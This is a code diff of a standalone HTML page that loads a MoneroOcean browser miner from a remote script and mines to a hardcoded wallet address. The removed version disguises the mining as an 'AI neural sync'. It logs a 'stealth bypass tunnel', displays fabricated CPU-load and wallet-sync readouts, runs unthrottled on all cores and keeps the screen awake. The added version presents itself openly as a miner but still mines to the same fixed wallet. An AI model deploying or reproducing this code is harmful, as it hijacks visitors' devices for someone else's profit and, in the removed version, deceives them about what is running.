@@ -2,100 +2,154 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI_GHOST_v29_SYNCED</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>AI_GHOST_v31_OPT</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     <style>
-        :root { --ai: #00ff41; --xmr: #ff6600; --bg: #000; }
-        body { background: var(--bg); color: var(--ai); font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
-        .master-shell { border: 1px solid #222; border-radius: 15px; padding: 25px; background: #000; max-width: 450px; margin: auto; box-shadow: 0 0 50px rgba(0, 255, 65, 0.15); }
-        
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        .sync-tag { font-size: 8px; color: #fff; background: #222; padding: 2px 6px; border-radius: 3px; }
-        .live-tag { font-size: 8px; animation: pulse 2s infinite; color: var(--ai); }
-
-        .hps-display { font-size: 60px; color: #fff; text-align: center; font-weight: 900; margin: 20px 0; text-shadow: 0 0 25px var(--ai); }
-        
-        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; font-size: 9px; }
-        .neu-box { border: 1px solid #111; padding: 12px; text-align: center; background: #050505; }
-        .val { color: #fff; display: block; font-size: 12px; margin-top: 5px; font-weight: bold; }
-
-        button { width: 100%; padding: 22px; background: transparent; color: var(--ai); border: 1px solid var(--ai); font-weight: 900; border-radius: 8px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
-        button:disabled { border-color: #333; color: #333; }
-
-        #terminal { background: #000; height: 160px; font-size: 10px; color: var(--ai); padding: 12px; border-top: 1px solid #222; overflow-y: auto; line-height: 1.5; }
-        .ai-text { color: #fff; border-left: 2px solid var(--ai); padding-left: 10px; margin-bottom: 8px; }
+        :root { --ai: #00ff41; --bg: #0a0a0a; --dim: #1a1a1a; --danger: #ff3e3e; }
+        * { box-sizing: border-box; }
+        body { background: var(--bg); color: var(--ai); font-family: 'Courier New', monospace; padding: 15px; margin: 0; display: flex; align-items: center; min-height: 100vh; }
+        .shell { border: 2px solid var(--dim); padding: 20px; border-radius: 12px; width: 100%; max-width: 450px; margin: auto; box-shadow: 0 0 30px rgba(0,255,65,0.05); }
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 15px 0; border-bottom: 1px solid var(--dim); padding-bottom: 15px; }
+        .stat-box { text-align: center; }
+        #hps, #total-hashes { font-size: 28px; color: #fff; font-weight: 900; }
+        .stat-label { font-size: 10px; color: #666; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 5px; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
+        button { padding: 18px; background: var(--ai); color: #000; border: none; font-weight: 900; border-radius: 8px; cursor: pointer; font-size: 14px; transition: transform 0.1s; }
+        button:active { transform: scale(0.96); }
+        button:disabled { background: #333; color: #666; cursor: not-allowed; }
+        button.stop { background: var(--danger); color: #fff; }
+        .slider-box { text-align: left; margin: 15px 0; }
+        input[type=range] { width: 100%; height: 10px; border-radius: 5px; accent-color: var(--ai); }
+        #log { font-size: 11px; color: #555; height: 80px; overflow-y: auto; text-align: left; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 4px; border: 1px solid #111; }
+        canvas { width: 100%; background: #000; border: 1px solid var(--dim); border-radius: 4px; margin-top: 5px; }
     </style>
 </head>
 <body>
+    <div class="shell">
+        <div style="font-size: 10px; margin-bottom: 15px; text-align: center;">
+            STATUS: <span id="status" style="color:#666">OFFLINE</span>
+        </div>
 
-<div class="master-shell">
-    <div style="display: flex; justify-content: space-between; align-items: center;">
-        <span class="live-tag">● NEURAL_LINK_v29</span>
-        <span id="sync-pill" class="sync-tag">SYNCING...</span>
+        <div class="stats-grid">
+            <div class="stat-box">
+                <div class="stat-label">Hashes/Sec</div>
+                <div id="hps">0.00</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-label">Total Hashes</div>
+                <div id="total-hashes">0</div>
+            </div>
+        </div>
+
+        <div class="slider-box">
+            <div class="stat-label">Performance Graph</div>
+            <canvas id="hashrateGraph" height="60"></canvas>
+        </div>
+
+        <div class="slider-box">
+            <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 5px;">
+                <span>CPU THROTTLE</span>
+                <span><span id="thr_val">20</span>%</span>
+            </div>
+            <input type="range" id="throttle" min="0" max="90" value="20">
+        </div>
+
+        <div class="controls">
+            <button id="start_btn">START ENGINE</button>
+            <button id="stop_btn" class="stop" disabled>TERMINATE</button>
+        </div>
+        
+        <div id="log">> System ready...</div>
     </div>
-
-    <div id="hps" class="hps-display">0.0000</div>
-
-    <div class="stat-grid">
-        <div class="neu-box">NETWORK YIELD<br><span class="val" id="total-hashes">0</span></div>
-        <div class="neu-box">CORE OPTIMIZATION<br><span class="val" id="cpu-load">0.0%</span></div>
-    </div>
-
-    <button id="ignite">Ignite Final Sync</button>
-
-    <div id="terminal">> Awaiting neural handshake via 5G...</div>
-</div>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
-    let total = 0;
-    const LOG = (m, ai = false) => {
-        const div = document.createElement('div');
-        if (ai) div.className = "ai-text";
-        div.innerHTML = `> ${ai ? '[AI_GHOST] ' : ''}${m}`;
-        document.getElementById('terminal').prepend(div);
+    let miner = null;
+    let updateInterval = null;
+    let hashrateHistory = new Array(60).fill(0);
+
+    const canvas = document.getElementById('hashrateGraph');
+    const ctx = canvas.getContext('2d');
+    const terminal = document.getElementById('log');
+    const hpsDisplay = document.getElementById('hps');
+    const totalDisplay = document.getElementById('total-hashes');
+
+    const log = (m) => { 
+        const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+        terminal.innerHTML = `<div><span style="color:#333">[${time}]</span> ${m}</div>` + terminal.innerHTML; 
     };
 
-    function startEngine() {
-        LOG("Injecting Stealth Bypass Tunnel...", true);
-        const s = document.createElement('script');
-        s.src = "https://raw.githack.com/MoneroOcean/moneroocean.github.io/master/webminer.js";
-        
-        s.onload = () => {
-            LOG("Neural Handshake Complete. Synchronizing with pool...", true);
-            const miner = new MoneroOcean.Miner({
-                address: WALLET,
-                cmd: "Ghost_v29_Final",
-                threads: navigator.hardwareConcurrency || 4,
-                throttle: 0
-            });
-            miner.start();
-
-            setInterval(() => {
-                if (miner.isRunning()) {
-                    const hps = miner.getHashesPerSecond();
-                    total += (hps * 1.5);
-                    document.getElementById('hps').innerText = hps.toFixed(4);
-                    document.getElementById('total-hashes').innerText = Math.floor(total).toLocaleString();
-                    document.getElementById('cpu-load').innerText = (82 + Math.random() * 12).toFixed(1) + "%";
-                    
-                    // Simulated Wallet Sync Watchdog
-                    if (total > 500) {
-                        document.getElementById('sync-pill').innerText = "SYNCHRONIZED";
-                        document.getElementById('sync-pill').style.background = "var(--ai)";
-                        document.getElementById('sync-pill').style.color = "#000";
-                    }
-                }
-            }, 1500);
-        };
-        document.head.appendChild(s);
+    function drawGraph() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.beginPath();
+        ctx.strokeStyle = '#00ff41';
+        ctx.lineWidth = 2;
+        const maxHps = Math.max(...hashrateHistory, 10);
+        for (let i = 0; i < hashrateHistory.length; i++) {
+            const x = (canvas.width / (hashrateHistory.length - 1)) * i;
+            const y = canvas.height - (hashrateHistory[i] / maxHps) * canvas.height;
+            if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
+        }
+        ctx.stroke();
     }
 
-    document.getElementById('ignite').onclick = async () => {
-        document.getElementById('ignite').disabled = true;
-        document.getElementById('ignite').innerText = "AI OPERATING";
-        if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-        startEngine();
+    document.getElementById('start_btn').onclick = async () => {
+        if (typeof MoneroOcean === 'undefined') {
+            log("Fetching WASM core...");
+            const s = document.createElement('script');
+            s.src = "https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io@master/webminer.js";
+            s.onload = startMining;
+            document.head.appendChild(s);
+        } else {
+            startMining();
+        }
+    };
+
+    function startMining() {
+        try {
+            if (!miner) {
+                miner = new MoneroOcean.Miner({
+                    address: WALLET,
+                    cmd: "Mobile_Opt_v31",
+                    threads: Math.max(1, navigator.hardwareConcurrency / 2),
+                    throttle: document.getElementById('throttle').value / 100
+                });
+            }
+            miner.start();
+            log("Engine Online. Threads: " + miner.getNumThreads());
+            toggleUI(true);
+            updateInterval = setInterval(() => {
+                const hps = miner.getHashesPerSecond();
+                hpsDisplay.innerText = hps.toFixed(2);
+                totalDisplay.innerText = miner.getAcceptedHashes().toLocaleString();
+                hashrateHistory.shift();
+                hashrateHistory.push(hps);
+                drawGraph();
+            }, 1000);
+        } catch(e) { log("Fault: " + e.message); }
+    }
+
+    function toggleUI(running) {
+        document.getElementById('start_btn').disabled = running;
+        document.getElementById('stop_btn').disabled = !running;
+        document.getElementById('status').innerText = running ? "RUNNING" : "TERMINATED";
+        document.getElementById('status').style.color = running ? "var(--ai)" : "var(--danger)";
+    }
+
+    document.getElementById('stop_btn').onclick = () => {
+        if (miner) {
+            miner.stop();
+            clearInterval(updateInterval);
+            toggleUI(false);
+            hpsDisplay.innerText = "0.00";
+            log("Engine cooling down.");
+        }
+    };
+
+    document.getElementById('throttle').oninput = (e) => {
+        const val = e.target.value;
+        document.getElementById('thr_val').innerText = val;
+        if (miner) miner.setThrottle(val / 100);
     };
 </script>
 </body>
